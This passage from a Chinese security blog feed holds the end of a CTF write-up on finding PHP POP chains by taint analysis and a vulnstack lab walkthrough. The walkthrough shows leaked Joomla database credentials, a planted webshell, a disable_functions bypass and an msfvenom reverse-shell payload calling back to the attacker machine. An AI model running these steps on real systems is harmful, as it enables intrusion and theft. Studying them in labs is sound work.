class="hljs-keyword">elif</span> <span class="hljs-built_in">type</span>(i) <span class="hljs-keyword">is</span> Eval:<span class="hljs-comment"># the end，拿到这个就结束</span><br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br></code></pre></td></tr></table></figure><p>判断当前的函数是否有效传递，类似于一行行读代码，每种情况调用相关的处理模块</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">search</span>(<span class="hljs-params">node, attr, method, path=[]</span>):<br>    path.append((node, attr, method))<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> node.nodes:<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">type</span>(i) <span class="hljs-keyword">is</span> Method <span class="hljs-keyword">and</span> i.name == method:<br>            ctx = <span class="hljs-built_in">type</span>(<span class="hljs-string">&#x27;&#x27;</span>, (<span class="hljs-built_in">object</span>,), &#123;&#125;)()<br>            <span class="hljs-keyword">if</span> handle_method(ctx, i):<br>                good_paths.append(<span class="hljs-built_in">list</span>(path))<br>    path.pop()<br></code></pre></td></tr></table></figure><p>重头戏，深度优先算法找 pop链，每遇到一个被调函数就找到对应的类去尝试调用，通过上面的模块判断当前函数能否成功传递信息，直到返回 True，也就是找到 eval 函数。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python">good_paths = []<br>search(classes[<span class="hljs-string">&#x27;dLEWX3&#x27;</span>], <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-string">&#x27;L8IHXt&#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">len</span>(good_paths))<br><span class="hljs-keyword">for</span> n, a, m <span class="hljs-keyword">in</span> good_paths[<span class="hljs-number">0</span>]:<br>    <span class="hljs-built_in">print</span>(n.name, a, m)<br></code></pre></td></tr></table></figure><p>到这一步就已经解决问题了，成功找到了一条调用链并打印出来，通过一个全局变量 <code>good_paths</code> 存储</p><p>再往下就是自动生成 <code>payload</code> 和 自动提交，这也是佩服老学长的地方，偷懒都偷的无可挑剔，给的exp开箱即用，完全不需要二次处理，赞！</p><h5 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h5><p>整体回顾，学长的exp可以从 <strong>污点分析</strong> 的角度来理解。</p><p>污点分析定义：</p><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey">污点分析可以抽象成一个三元组`&lt;sources,sinks,sanitizers&gt;`的形式,其中,source 即污点源,代表直接引入不受信任的数据或者机密数据到系统中<span class="hljs-comment">;sink即污点汇聚点,代表直接产生安全敏感操作(违反数据完整性)或者泄露隐私数据到外界(违反数据保密性);sanitizer即无害处理,代表通过数据加密或者移除危害操作等手段使数据传播不再对软件系统的信息安全产生危害.污点分析就是分析程序中由污点源引入的数据是否能够不经无害处理,而直接传播到污点汇聚点.如果不能,说明系统是信息流安全的;否则,说明系统产生了隐私数据泄露或危险数据操作等安全问题.</span><br></code></pre></td></tr></table></figure><p>这道题中，<code>source</code> 就是作者留下的反序列化入口，也就是 <code>dLEWX3</code> 类的 <code>L8IHXt</code> 方法接收的参数 ，<code>sink</code> 就是我们想实现的 <code>eval</code> 函数</p><p><code>sanitizer</code> 则是过程中的各种操作(直接赋值，if后赋值，for内赋值)，而函数的相互调用过程就是污点的传播过程，而我们的 <code>good_paths</code> 里存的，就是一条可行的污点传播链(这可不good)</p><p>exp中定义的各种模块就在做一件事：判断是否 <strong>消毒</strong> ，消毒了就返回 False，然后在 <code>search</code> 模块里把当前路径 pop 掉，然后进入下一条语句继续，直到找到完整的传播链或不可达。</p><p>理解了后会发现这种题其实不难，虽然看起来类很多，但每个被调函数都只在唯一的类中声明，也就是从函数到类是具有唯一性的，这就避免了相互调用陷入循环的尴尬处境，最多会在同一个函数里出现两三个 <code>岔路口</code> , 其余时间都在前进和消毒，也正因为此，才可用较为简洁的代码完成题目。</p><p>最后再次感谢老学长的帮助 😋</p><h5 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h5><p>[强网杯<a href="https://www.anquanke.com/post/id/244153">pop_master]与[陀那多]赛题的出题记录-安全客</a></p><p><a href="https://blog.frankli.site/2021/06/15/Misc/libphpserialize/">python实现的php序列化 (frankli.site)</a></p><p><a href="https://www.freebuf.com/articles/web/279680.html">pop_master的花式解题思路 - FreeBuf网络安全行业门户</a></p><p><a href="https://pypi.com.cn/project/phply/">phply - 使用 PLY 实现的 PHP 源的词法分析器和解析器_PyPI中文网</a></p><p><a href="https://www.anquanke.com/post/id/264231">从一道题浅谈污点分析-安全客</a></p><p><a href="https://www.k0rz3n.com/2019/03/01/%E7%AE%80%E5%8D%95%E7%90%86%E8%A7%A3%E6%B1%A1%E7%82%B9%E5%88%86%E6%9E%90%E6%8A%80%E6%9C%AF/">简单理解污点分析技术 | K0rz3n’s Blog</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>学习</tag>
      
      <tag>ctf</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>vulnstack靶场日记-4</title>
    <link href="/2023/12/12/vulnstack%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0-4/"/>
    <url>/2023/12/12/vulnstack%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0-4/</url>
    
    <content type="html"><![CDATA[<h3 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h3><p>[TOC]</p><h3 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h3><h4 id="前置配置"><a href="#前置配置" class="headerlink" title="前置配置"></a>前置配置</h4><p>下载完靶机解压后是 <code>ovf</code> 文件，先利用 <code>ovftool</code> 转换为 <code>vmx</code> 文件，再导入 <code>vmware</code></p><figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs moonscript"># cmd 类似这种形式转换<br>ovftool.exe <span class="hljs-name">D</span>:\vmware\vulnstack\threst环境\DC\DC.ovf <span class="hljs-name">D</span>:\vmware\vulnstack\threst环境\DC\DC.vmx<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>解题记录</tag>
      
      <tag>学习</tag>
      
      <tag>vulnstack</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>vulnstack靶场日记-3</title>
    <link href="/2023/12/06/vulnstack%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0-3/"/>
    <url>/2023/12/06/vulnstack%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0-3/</url>
    
    <content type="html"><![CDATA[<h3 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h3><p>[TOC]</p><h3 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h3><p>建议内存130G+，我预留了120G，做到一半没内存了还要删游戏😭</p><p>攻击机 </p><ul><li>kali</li></ul><p>靶机：</p><ul><li>web-centos</li><li>web1-ubuntu</li><li>win2008(x64)</li><li>win server 2012(x64)</li><li>pc win7(x64)</li></ul><p>提前开启一块网卡 <code>VMnet2</code> 配置ip段 <code>192.168.93.0/24</code>，kali 和 web 桥接模式</p><h4 id="网络环境"><a href="#网络环境" class="headerlink" title="网络环境"></a>网络环境</h4><h4 id="外网"><a href="#外网" class="headerlink" title="外网"></a>外网</h4><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">kali</span> <span class="hljs-number">192.168.1.28</span><br>web  <span class="hljs-number">192.168.1.29</span><br></code></pre></td></tr></table></figure><h4 id="内网"><a href="#内网" class="headerlink" title="内网"></a>内网</h4><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">web</span>  <span class="hljs-number">192.168.93.100</span><br>web1 <br>win2008 <span class="hljs-number">192.168.93.20</span><br>win server <span class="hljs-number">192.168.93.10</span><br>win7  <span class="hljs-number">192.168.93.30</span><br></code></pre></td></tr></table></figure><p>黑盒渗透，不知道靶机启动密码和内网配置，以上内容只做环境配置参考</p><h3 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h3><h4 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h4><p>目标 <code>192.168.1.29</code> , <code>nmap</code>扫开放端口 22,80,3306 </p><p>访问80网页，一个博客页面<img src="/2023/12/06/vulnstack%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0-3/image-20231209112545106.png" alt="image-20231209112545106"></p><p>robots.txt</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs dts">User-agent: *<br><span class="hljs-symbol">Disallow:</span> <span class="hljs-keyword">/administrator/</span><br><span class="hljs-symbol">Disallow:</span> <span class="hljs-keyword">/bin/</span><br><span class="hljs-symbol">Disallow:</span> <span class="hljs-keyword">/cache/</span><br><span class="hljs-symbol">Disallow:</span> <span class="hljs-keyword">/cli/</span><br><span class="hljs-symbol">Disallow:</span> <span class="hljs-keyword">/components/</span><br><span class="hljs-symbol">Disallow:</span> <span class="hljs-keyword">/includes/</span><br><span class="hljs-symbol">Disallow:</span> <span class="hljs-keyword">/installation/</span><br><span class="hljs-symbol">Disallow:</span> <span class="hljs-keyword">/language/</span><br><span class="hljs-symbol">Disallow:</span> <span class="hljs-keyword">/layouts/</span><br><span class="hljs-symbol">Disallow:</span> <span class="hljs-keyword">/libraries/</span><br><span class="hljs-symbol">Disallow:</span> <span class="hljs-keyword">/logs/</span><br><span class="hljs-symbol">Disallow:</span> <span class="hljs-keyword">/modules/</span><br><span class="hljs-symbol">Disallow:</span> <span class="hljs-keyword">/plugins/</span><br><span class="hljs-symbol">Disallow:</span> <span class="hljs-keyword">/tmp/</span><br></code></pre></td></tr></table></figure><p>点击<code>My Blog</code> 下载 <code>index.php</code> 文件，判断网站cms为 <code>joomla</code></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-comment">&lt;!-- generator=&quot;Joomla! - Open Source Content Management&quot; --&gt;</span><br></code></pre></td></tr></table></figure><p>扫目录</p><figure class="highlight puppet"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs puppet">/1.php                 phpinfo()<br>/README.txt            确定版本为3.x<br>/web.config.txt        网站访问配置文件<br>/configuration.php~    boom！出货了<br><br>è¯·ç¨å€™è®¿é—®ã€‚<span class="hljs-string">&#x27;; public <span class="hljs-variable">$display_offline_message</span> = &#x27;</span>1<span class="hljs-string">&#x27;; public <span class="hljs-variable">$offline_image</span> = &#x27;</span><span class="hljs-string">&#x27;; public <span class="hljs-variable">$sitename</span> = &#x27;</span>test<span class="hljs-string">&#x27;; public <span class="hljs-variable">$editor</span> = &#x27;</span>tinymce<span class="hljs-string">&#x27;; public <span class="hljs-variable">$captcha</span> = &#x27;</span>0<span class="hljs-string">&#x27;; public <span class="hljs-variable">$list_limit</span> = &#x27;</span>20<span class="hljs-string">&#x27;; public <span class="hljs-variable">$access</span> = &#x27;</span>1<span class="hljs-string">&#x27;; public <span class="hljs-variable">$debug</span> = &#x27;</span>0<span class="hljs-string">&#x27;; public <span class="hljs-variable">$debug_lang</span> = &#x27;</span>0<span class="hljs-string">&#x27;; public <span class="hljs-variable">$debug_lang_const</span> = &#x27;</span>1<span class="hljs-string">&#x27;; public <span class="hljs-variable">$dbtype</span> = &#x27;</span>mysqli<span class="hljs-string">&#x27;; public <span class="hljs-variable">$host</span> = &#x27;</span>localhost<span class="hljs-string">&#x27;; public <span class="hljs-variable">$user</span> = &#x27;</span>testuser<span class="hljs-string">&#x27;; public <span class="hljs-variable">$password</span> = &#x27;</span>cvcvgjASD!@<span class="hljs-string">&#x27;; public <span class="hljs-variable">$db</span> = &#x27;</span>joomla<span class="hljs-string">&#x27;; public <span class="hljs-variable">$dbprefix</span> = &#x27;</span>am2zu_<span class="hljs-string">&#x27;; public <span class="hljs-variable">$live_site</span> = &#x27;</span><span class="hljs-string">&#x27;; public <span class="hljs-variable">$secret</span> = &#x27;</span>gXN9Wbpk7ef3A4Ys<span class="hljs-string">&#x27;; public <span class="hljs-variable">$gzip</span> = &#x27;</span>0<span class="hljs-string">&#x27;; public <span class="hljs-variable">$error_reporting</span> = &#x27;</span>default<span class="hljs-string">&#x27;; public <span class="hljs-variable">$helpurl</span> = &#x27;</span>https://help.joomla.org/proxy?keyref=Help&#123;major&#125;&#123;minor&#125;:&#123;keyref&#125;&amp;lang=&#123;langcode&#125;<span class="hljs-string">&#x27;; public <span class="hljs-variable">$ftp_host</span> = &#x27;</span><span class="hljs-string">&#x27;; public <span class="hljs-variable">$ftp_port</span> = &#x27;</span><span class="hljs-string">&#x27;; public <span class="hljs-variable">$ftp_user</span> = &#x27;</span><span class="hljs-string">&#x27;; public <span class="hljs-variable">$ftp_pass</span> = &#x27;</span><span class="hljs-string">&#x27;; public <span class="hljs-variable">$ftp_root</span> = &#x27;</span><span class="hljs-string">&#x27;; public <span class="hljs-variable">$ftp_enable</span> = &#x27;</span>0<span class="hljs-string">&#x27;; public <span class="hljs-variable">$offset</span> = &#x27;</span>UTC<span class="hljs-string">&#x27;; public <span class="hljs-variable">$mailonline</span> = &#x27;</span>1<span class="hljs-string">&#x27;; public <span class="hljs-variable">$mailer</span> = &#x27;</span>mail<span class="hljs-string">&#x27;; public <span class="hljs-variable">$mailfrom</span> = &#x27;</span>test@test.com<span class="hljs-string">&#x27;; public <span class="hljs-variable">$fromname</span> = &#x27;</span>test<span class="hljs-string">&#x27;; public <span class="hljs-variable">$sendmail</span> = &#x27;</span>/usr/sbin/sendmail<span class="hljs-string">&#x27;; public <span class="hljs-variable">$smtpauth</span> = &#x27;</span>0<span class="hljs-string">&#x27;; public <span class="hljs-variable">$smtpuser</span> = &#x27;</span><span class="hljs-string">&#x27;; public <span class="hljs-variable">$smtppass</span> = &#x27;</span><span class="hljs-string">&#x27;; public <span class="hljs-variable">$smtphost</span> = &#x27;</span>localhost<span class="hljs-string">&#x27;; public <span class="hljs-variable">$smtpsecure</span> = &#x27;</span>none<span class="hljs-string">&#x27;; public <span class="hljs-variable">$smtpport</span> = &#x27;</span>25<span class="hljs-string">&#x27;; public <span class="hljs-variable">$caching</span> = &#x27;</span>0<span class="hljs-string">&#x27;; public <span class="hljs-variable">$cache_handler</span> = &#x27;</span>file<span class="hljs-string">&#x27;; public <span class="hljs-variable">$cachetime</span> = &#x27;</span>15<span class="hljs-string">&#x27;; public <span class="hljs-variable">$cache_platformprefix</span> = &#x27;</span>0<span class="hljs-string">&#x27;; public <span class="hljs-variable">$MetaDesc</span> = &#x27;</span><span class="hljs-string">&#x27;; public <span class="hljs-variable">$MetaKeys</span> = &#x27;</span><span class="hljs-string">&#x27;; public <span class="hljs-variable">$MetaTitle</span> = &#x27;</span>1<span class="hljs-string">&#x27;; public <span class="hljs-variable">$MetaAuthor</span> = &#x27;</span>1<span class="hljs-string">&#x27;; public <span class="hljs-variable">$MetaVersion</span> = &#x27;</span>0<span class="hljs-string">&#x27;; public <span class="hljs-variable">$robots</span> = &#x27;</span><span class="hljs-string">&#x27;; public <span class="hljs-variable">$sef</span> = &#x27;</span>1<span class="hljs-string">&#x27;; public <span class="hljs-variable">$sef_rewrite</span> = &#x27;</span>0<span class="hljs-string">&#x27;; public <span class="hljs-variable">$sef_suffix</span> = &#x27;</span>0<span class="hljs-string">&#x27;; public <span class="hljs-variable">$unicodeslugs</span> = &#x27;</span>0<span class="hljs-string">&#x27;; public <span class="hljs-variable">$feed_limit</span> = &#x27;</span>10<span class="hljs-string">&#x27;; public <span class="hljs-variable">$feed_email</span> = &#x27;</span>none<span class="hljs-string">&#x27;; public <span class="hljs-variable">$log_path</span> = &#x27;</span>/var/www/html/administrator/logs<span class="hljs-string">&#x27;; public <span class="hljs-variable">$tmp_path</span> = &#x27;</span>/var/www/html/tmp<span class="hljs-string">&#x27;; public <span class="hljs-variable">$lifetime</span> = &#x27;</span>15<span class="hljs-string">&#x27;; public <span class="hljs-variable">$session_handler</span> = &#x27;</span>database<span class="hljs-string">&#x27;; public <span class="hljs-variable">$shared_session</span> = &#x27;</span>0<span class="hljs-string">&#x27;; &#125;</span><br><span class="hljs-string"></span><br><span class="hljs-string">关键信息</span><br><span class="hljs-string">public <span class="hljs-variable">$user</span> = &#x27;</span>testuser<span class="hljs-string">&#x27;;</span><br><span class="hljs-string">public <span class="hljs-variable">$password</span> = &#x27;</span>cvcvgjASD!@<span class="hljs-string">&#x27;;</span><br><span class="hljs-string">public <span class="hljs-variable">$db</span> = &#x27;</span>joomla<span class="hljs-string">&#x27;;</span><br><span class="hljs-string">public <span class="hljs-variable">$dbprefix</span> = &#x27;</span>am2zu_<span class="hljs-string">&#x27;;</span><br><span class="hljs-string">public <span class="hljs-variable">$secret</span> = &#x27;</span>gXN9Wbpk7ef3A4Ys<span class="hljs-string">&#x27;;</span><br></code></pre></td></tr></table></figure><p>尝试利用上述账号密码登录失败，继续寻找</p><h4 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p>搜索得知，msf内置了 <code>joomla</code> 的漏洞，打开msfconsole</p><p><img src="/2023/12/06/vulnstack%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0-3/image-20231209123634411.png" alt="image-20231209123634411"></p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-comment"># msf</span><br>use auxiliary/scanner/http/joomla_version<br><span class="hljs-built_in">set</span> rhost 192.168.1.29<br><span class="hljs-built_in">set</span> threads 100<br>run<br></code></pre></td></tr></table></figure><p><img src="/2023/12/06/vulnstack%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0-3/image-20231209124336792.png" alt="image-20231209124336792"></p><p>跟这个版本对应的只找到了一个洞，而且需要登陆后利用，到此尝试失败</p><h4 id="mysql"><a href="#mysql" class="headerlink" title="mysql"></a>mysql</h4><p>打不通就回到信息收集，当时开放的端口还有22和3306，我们分别用这些账号密码尝试 <code>ssh</code> 和 <code>mysql</code> 登录</p><p>将上述疑似账号密码写进一个文档<img src="/2023/12/06/vulnstack%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0-3/image-20231209125343847.png" alt="image-20231209125343847"></p><ol><li><p>先尝试用 <code>hydra</code> 爆破 <code>ssh</code> 登录，报错了，再尝试用ssh直接连接也报错，搜索得知版本不匹配<img src="/2023/12/06/vulnstack%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0-3/image-20231209130254304.png" alt="image-20231209130254304"></p></li><li><p>加参数手工测试一下这几组数据，密码错误，排除 ssh 登录</p></li></ol><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">ssh <span class="hljs-attribute">-oKexAlgorithms</span>=+diffie-hellman-group1-sha1 <span class="hljs-attribute">-oHostKeyAlgorithms</span>=+ssh-dss <span class="hljs-attribute">-oCiphers</span>=+3des-cbc testuser@192.168.1.29<br></code></pre></td></tr></table></figure><ol start="3"><li>尝试mysql连接， <code>testuser/cvcvgjASD!@</code> 登陆成功</li></ol><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-comment"># terminal</span><br><span class="hljs-attribute">systemctl</span> restart mysql<br>mysql -h <span class="hljs-number">192.168.1.29</span> -utestuser -p<br></code></pre></td></tr></table></figure><ol start="4"><li><p>用可视化工具连接数据库，这里使用 <a href="https://dbeaver.io/">DBeaver Community | Free Universal Database Tool</a> 好家伙，表可真不少嘞，找找有用的信息</p><p>在 <code>am2zu_users</code> 表中存有一个数据<img src="/2023/12/06/vulnstack%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0-3/image-20231209134708055.png" alt="image-20231209134708055"></p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">username:</span> administrator<br><span class="hljs-symbol">password:</span> $<span class="hljs-number">2</span><span class="hljs-built_in">y</span><span class="hljs-number">$10</span><span class="hljs-number">$t1RelJijihpPhL8LARC9JuM</span>/AWrVR.nto/XycrybdRbk8IEg6Dze2<br>密码经过加密，无法直接利用，但是我们可以尝试添加一个新用户，只要能登录管理后台就能尝试上传木马<br></code></pre></td></tr></table></figure></li><li><p>找到一篇 <code>joomla</code> 重置密码的文章 <a href="https://docs.joomla.org/How_do_you_recover_or_reset_your_admin_password%3F/zh-cn">如何恢复或重置管理员密码</a> ，按照教程将管理员密码置为 <code>secret</code> ，尝试登录<img src="/2023/12/06/vulnstack%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0-3/image-20231209135422451.png" alt="image-20231209135422451"><img src="/2023/12/06/vulnstack%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0-3/image-20231209135525738.png" alt="image-20231209135525738">!<img src="/2023/12/06/vulnstack%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0-3/image-20231209135721864.png" alt="image-20231209135721864"></p></li><li><p>成功登入管理员账户，发现后台可直接修改模板文件，在任意页面添加一句话木马，蚁剑连接 <code>http://192.168.1.29/templates/beez3/error.php</code> 密码 a<img src="/2023/12/06/vulnstack%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0-3/image-20231209141302248.png" alt="image-20231209141302248"><img src="/2023/12/06/vulnstack%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0-3/image-20231209141424058.png" alt="image-20231209141424058"></p><p>连上后尝试执行命令失败，回到之前发现的 <code>1.php</code> ，发现 <code>disable_functions</code> <img src="/2023/12/06/vulnstack%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0-3/image-20231209143217613.png" alt="image-20231209143217613"></p><p>搜索得知，该情况可以利用黑名单中不存在的函数来执行命令，如 <code>pcntl_exec() 结合 python</code> ，也可利用 <code>LD_PRELOAD 环境变量</code> 。。。方法很多，这里直接用蚁剑的 bypass插件(下载时需要设置代理) 来实现</p></li></ol><h4 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h4><p>分别在 msf 和 cs 生成后门文件，上传并执行，拿到 <code>meterpreter</code> 和 <code>cs上线</code> </p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-comment"># kali</span><br>msfvenom -p linux/x86/meterpreter_reverse_tcp <span class="hljs-attribute">lhost</span>=192.168.1.28 <span class="hljs-attribute">lport</span>=4444 -f elf &gt; shell.elf<br><br><span class="hljs-comment"># msf</span><br>use exploit/multi/handler<br><span class="hljs-built_in">set</span> payload linux/x86/meterpreter_reverse_tcp<br><span class="hljs-built_in">set</span> lhost 192.168.1.28<br>run<br></code></pre></td></tr></table></figure><p>上传后运行失败，尝试直接命令行反弹shell，也失败，经过一番检查，发现网卡信息有些不对劲<img src="/2023/12/06/vulnstack%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0-3/image-20231209152756012.png" alt="image-20231209152756012"></p><p>只有内网？没有外网网卡，所以反弹shell分本到不了我的kali，但这不应该，我的kali明明可以访问到它，它明明有公网ip。。。除非。。。我访问的不是 <code>web</code> 靶机。。。艹！做到这里我是有点焦虑的，就直接用 <code>web</code> 靶机的命令行查找网站根目录，结果根本没有…好吧，看来确实不是同一台机子，应该是做了端口转发之类的，当我访问 <code>web</code> 靶机的80端口的时候，会自动给我转发到另外一台机子…哔了狗了</p><h5 id="内网信息搜集"><a href="#内网信息搜集" class="headerlink" title="内网信息搜集"></a>内网信息搜集</h5><p>没思路怎么办，继续搜集信息，先看看这台到手的机子(web1)有没有敏感信息</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs elixir">/etc/<span class="hljs-symbol">passwd:</span><br><br><span class="hljs-symbol">root:</span><span class="hljs-symbol">x:</span><span class="hljs-number">0</span><span class="hljs-symbol">:</span><span class="hljs-number">0</span><span class="hljs-symbol">:root</span><span class="hljs-symbol">:/root</span><span class="hljs-symbol">:/bin/bash</span><br><span class="hljs-symbol">daemon:</span><span class="hljs-symbol">x:</span><span class="hljs-number">1</span><span class="hljs-symbol">:</span><span class="hljs-number">1</span><span class="hljs-symbol">:daemon</span><span class="hljs-symbol">:/usr/sbin</span><span class="hljs-symbol">:/usr/sbin/nologin</span><br><span class="hljs-symbol">bin:</span><span class="hljs-symbol">x:</span><span class="hljs-number">2</span><span class="hljs-symbol">:</span><span class="hljs-number">2</span><span class="hljs-symbol">:bin</span><span class="hljs-symbol">:/bin</span><span class="hljs-symbol">:/usr/sbin/nologin</span><br><span class="hljs-symbol">sys:</span><span class="hljs-symbol">x:</span><span class="hljs-number">3</span><span class="hljs-symbol">:</span><span class="hljs-number">3</span><span class="hljs-symbol">:sys</span><span class="hljs-symbol">:/dev</span><span class="hljs-symbol">:/usr/sbin/nologin</span><br><span class="hljs-symbol">sync:</span><span class="hljs-symbol">x:</span><span class="hljs-number">4</span><span class="hljs-symbol">:</span><span class="hljs-number">65534</span><span class="hljs-symbol">:sync</span><span class="hljs-symbol">:/bin</span><span class="hljs-symbol">:/bin/sync</span><br><span class="hljs-symbol">games:</span><span class="hljs-symbol">x:</span><span class="hljs-number">5</span><span class="hljs-symbol">:</span><span class="hljs-number">60</span><span class="hljs-symbol">:games</span><span class="hljs-symbol">:/usr/games</span><span class="hljs-symbol">:/usr/sbin/nologin</span><br><span class="hljs-symbol">man:</span><span class="hljs-symbol">x:</span><span class="hljs-number">6</span><span class="hljs-symbol">:</span><span class="hljs-number">12</span><span class="hljs-symbol">:man</span><span class="hljs-symbol">:/var/cache/man</span><span class="hljs-symbol">:/usr/sbin/nologin</span><br><span class="hljs-symbol">lp:</span><span class="hljs-symbol">x:</span><span class="hljs-number">7</span><span class="hljs-symbol">:</span><span class="hljs-number">7</span><span class="hljs-symbol">:lp</span><span class="hljs-symbol">:/var/spool/lpd</span><span class="hljs-symbol">:/usr/sbin/nologin</span><br><span class="hljs-symbol">mail:</span><span class="hljs-symbol">x:</span><span class="hljs-number">8</span><span class="hljs-symbol">:</span><span class="hljs-number">8</span><span class="hljs-symbol">:mail</span><span class="hljs-symbol">:/var/mail</span><span class="hljs-symbol">:/usr/sbin/nologin</span><br><span class="hljs-symbol">news:</span><span class="hljs-symbol">x:</span><span class="hljs-number">9</span><span class="hljs-symbol">:</span><span class="hljs-number">9</span><span class="hljs-symbol">:news</span><span class="hljs-symbol">:/var/spool/news</span><span class="hljs-symbol">:/usr/sbin/nologin</span><br><span class="hljs-symbol">uucp:</span><span class="hljs-symbol">x:</span><span class="hljs-number">10</span><span class="hljs-symbol">:</span><span class="hljs-number">10</span><span class="hljs-symbol">:uucp</span><span 